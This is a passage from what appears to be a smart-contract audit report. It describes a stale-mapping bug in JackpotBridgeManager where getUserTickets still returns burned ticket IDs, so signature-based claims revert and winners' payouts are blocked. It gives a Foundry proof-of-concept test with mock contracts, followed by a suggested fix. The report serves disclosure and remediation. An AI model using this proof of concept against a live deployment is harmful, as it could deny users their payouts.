    for (uint256 i = 0; i < userDrawingTickets.totalTicketsOwned; i++) {
        uint256 ticketId = userDrawingTickets.ticketIds[i];
        if (ticketOwner[ticketId] == _user) {
            ticketIds[i] = ticketId; // no ERC721 existence/owner check
        }
    }
    return ticketIds;
}

and in claimWinnings(), the mapping is never cleared after burn:

## Impact
Cross-chain payout claims built from getUserTickets include burned IDs; signature-based claims revert in Jackpot.claimWinnings, blocking winners’ matured payouts until off-chain workarounds are deployed.

## Command to Run Test


## Proof of Concept
1) User buys a ticket via BridgeManager. ticketOwner[ticketId] is set and userTickets list updated.
2) Keeper builds a signature-based claim and calls BridgeManager.claimWinnings; Jackpot burns the ticket and pays USDC.
3) getUserTickets(user, drawingId) still returns ticketId (stale mapping).
4) Keeper naïvely uses getUserTickets to build a second EIP-712 claim for the same (now-burned) ticket; _validateTicketOwnership passes, but Jackpot.claimWinnings reverts at ownerOf(ticketId) check. Bridging does not execute. Users’ matured payouts are DoSed if keeper always relies on getUserTickets.
5) This persists for that drawing because BridgeManager never clears ticketOwner or prunes the per-drawing ticket list on burn.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {JackpotBridgeManager} from "contracts/JackpotBridgeManager.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IJackpotTicketNFT} from "contracts/interfaces/IJackpotTicketNFT.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockUSDC is IERC20 {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    mapping(address=>uint256) public override balanceOf;
    mapping(address=>mapping(address=>uint256)) public override allowance;
    uint256 public override totalSupply;
    function mint(address to, uint256 amt) external { balanceOf[to]+=amt; totalSupply+=amt; }
    function transfer(address to, uint256 amt) external override returns (bool){ require(balanceOf[msg.sender]>=amt,"bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function approve(address sp, uint256 amt) external override returns (bool){ allowance[msg.sender][sp]=amt; return true; }
    function transferFrom(address from, address to, uint256 amt) external override returns (bool){ require(allowance[from][msg.sender]>=amt,"allow"); require(balanceOf[from]>=amt,"bal"); allowance[from][msg.sender]-=amt; balanceOf[from]-=amt; balanceOf[to]+=amt; return true; }
}

contract MockTicketNFT is IJackpotTicketNFT {
    mapping(uint256=>address) public owners;
    mapping(uint256=>TrackedTicket) internal info;
    function mintTicket(address r, uint256 id, uint256 drawingId, uint256 packed, bytes32 ref) external { owners[id]=r; info[id]=TrackedTicket({drawingId:drawingId, packedTicket:packed, referralScheme:ref}); }
    function burnTicket(uint256 id) external { require(owners[id]!=address(0),"no token"); owners[id]=address(0); }
    function ownerOf(uint256 id) external view returns (address){ require(owners[id]!=address(0),"no owner"); return owners[id]; }
    function getTicketInfo(uint256 id) external view returns (TrackedTicket memory){ return info[id]; }
    function getUserTickets(address, uint256) external pure returns (ExtendedTrackedTicket[] memory){ ExtendedTrackedTicket[] memory x; return x; }
}

contract MockBridge {
    IERC20 public usdc;
    constructor(IERC20 _usdc){ usdc = _usdc; }
    // BridgeManager approves this contract; we pull the exact amount from BridgeManager
    function pull(uint256 amount) external { usdc.transferFrom(msg.sender, address(this), amount); }
}

contract MockJackpot is IJackpot {
    IERC20 public usdc;
    IJackpotTicketNFT public nft;
    uint256 public override currentDrawingId = 1;
    uint256 public price = 1_000_000; // 1 USDC
    uint256 nextId = 1;
    constructor(IERC20 _usdc, IJackpotTicketNFT _nft){ usdc=_usdc; nft=_nft; }
    function ticketPrice() external view override returns (uint256){ return price; }
    function buyTickets(Ticket[] memory _tickets, address _recipient, address[] memory, uint256[] memory, bytes32) external override returns (uint256[] memory ids){
        ids = new uint256[](_tickets.length);
        for (uint i=0;i<_tickets.length;i++){
            uint256 id = nextId++;
            // pack dummy ticket
            uint256 packed = 1 << _tickets[i].normals[0];
            nft.mintTicket(_recipient, id, currentDrawingId, packed, bytes32(0));
            ids[i]=id;
        }
    }
    function claimWinnings(uint256[] memory _userTicketIds) external override {
        // Only BridgeManager (msg.sender) must own the NFTs
        for (uint i=0;i<_userTicketIds.length;i++){
            require(MockTicketNFT(address(nft)).owners(_userTicketIds[i]) == msg.sender, "Not owner");
            nft.burnTicket(_userTicketIds[i]);
        }
        // pay a fixed amount per ticket (100 USDC)
        uint256 payout = _userTicketIds.length * 100_000_000; // 100 USDC per ticket
        MockUSDC(address(usdc)).transfer(msg.sender, payout);
    }
    function getUnpackedTicket(uint256, uint256) external pure returns (uint8[] memory, uint8){ uint8[] memory a=new uint8[](5); return (a,1); }
}

contract BridgeManager_GetUserTickets_StaleAfterBurn_Test is Test {
    MockUSDC usdc;
    MockTicketNFT ticket;
    MockJackpot jackpot;
    JackpotBridgeManager bm;
    MockBridge bridge;

    address relayer;
    uint256 userPk;
    address user;

    function setUp() public {
        usdc = new MockUSDC();
        ticket = new MockTicketNFT();
        jackpot = new MockJackpot(IERC20(address(usdc)), IJackpotTicketNFT(address(ticket)));
        bm = new JackpotBridgeManager(IJackpot(address(jackpot)), IJackpotTicketNFT(address(ticket)), IERC20(address(usdc)), "MegaPot", "1");
        bridge = new MockBridge(IERC20(address(usdc)));

        // actors
        relayer = address(0xBEE);
        userPk = 0xA11CE;
        user = vm.addr(userPk);

        // fund relayer and jackpot with USDC
        usdc.mint(relayer, 1_000_000_000_000); // 1,000,000 USDC
        usdc.mint(address(jackpot), 1_000_000_000_000);
        vm.startPrank(relayer);
        usdc.approve(address(bm), type(uint256).max);
        vm.stopPrank();
    }

    function _buyOneTicketForUser() internal returns (uint256 tid) {
        IJackpot.Ticket[] memory t = new IJackpot.Ticket[](1);
        t[0].normals = new uint8[](5);
        t[0].normals[0]=1; t[0].normals[1]=2; t[0].normals[2]=3; t[0].normals[3]=4; t[0].normals[4]=5;
        t[0].bonusball = 1;
        vm.prank(relayer);
        uint256[] memory ids = bm.buyTickets(t, user, new address[](0), new uint256[](0), bytes32(0));
        tid = ids[0];
        // Bridge manager should own the NFT
        assertEq(ticket.owners(tid), address(bm));
    }

    function _signClaim(uint256[] memory ids, uint256 amount) internal returns (bytes memory sig){
        JackpotBridgeManager.RelayTxData memory r = JackpotBridgeManager.RelayTxData({approveTo: address(bridge), to: address(bridge), data: abi.encodeWithSignature("pull(uint256)", amount)});
        bytes32 digest = bm.createClaimWinningsEIP712Hash(ids, r);
        (uint8 v, bytes32 r_, bytes32 s_) = vm.sign(userPk, digest);
        sig = abi.encodePacked(r_, s_, v);
    }

    function test_getUserTicketsReturnsBurnedIds_DoS() public {
        uint256 tid = _buyOneTicketForUser();
        uint256 drawingId = jackpot.currentDrawingId();

        // User sees their ticket via the bridge view
        uint256[] memory viewBefore = bm.getUserTickets(user, drawingId);
        assertEq(viewBefore.length, 1);
        assertEq(viewBefore[0], tid);

        // Keeper claims winnings (100 USDC payout) and bridges it out
        uint256[] memory claimIds = new uint256[](1); claimIds[0]=tid;
        bytes memory sig = _signClaim(claimIds, 100_000_000);
        JackpotBridgeManager.RelayTxData memory r = JackpotBridgeManager.RelayTxData({approveTo: address(bridge), to: address(bridge), data: abi.encodeWithSignature("pull(uint256)", 100_000_000)});
        vm.prank(relayer);
        bm.claimWinnings(claimIds, r, sig);

        // NFT burned by Jackpot, but bridge view still returns the old id
        uint256[] memory viewAfter = bm.getUserTickets(user, drawingId);
        assertEq(viewAfter.length, 1);
        assertEq(viewAfter[0], tid);
        // Owner query would revert if called on-chain; we can assert the token is gone via internal mapping
        // (Mock shows owners[tid] == address(0))
        (, bytes memory data) = address(ticket).staticcall(abi.encodeWithSignature("owners(uint256)", tid));
        address owner;
        assembly { owner := mload(add(data,32)) }
        assertEq(owner, address(0)); // burned

        // A naïve keeper using getUserTickets again signs a second claim for the same (now-burned) id -> reverts
        bytes memory sig2 = _signClaim(claimIds, 100_000_000);
        vm.prank(relayer);
        vm.expectRevert();
        bm.claimWinnings(claimIds, r, sig2);
    }
}


## Suggested Mitigation
Keep the referential structures in sync on burn and/or harden the view: (1) In JackpotBridgeManager.claimWinnings, after jackpot.claimWinnings() succeeds, iterate _userTicketIds and delete ticketOwner[ticketId] and optionally compact userTickets[_user][drawingId] (or mark slots as empty and skip them in the view). (2) In getUserTickets, additionally verify that the token exists and is currently held by the bridge: wrap IERC721(ownerOf) in a try/catch (or use a safe exists() helper) and only return ticketIds where ownerOf(ticketId) == address(this). Either fix prevents burned or transferred tickets from being surfaced and blocks stale signatures from causing keeper reverts.



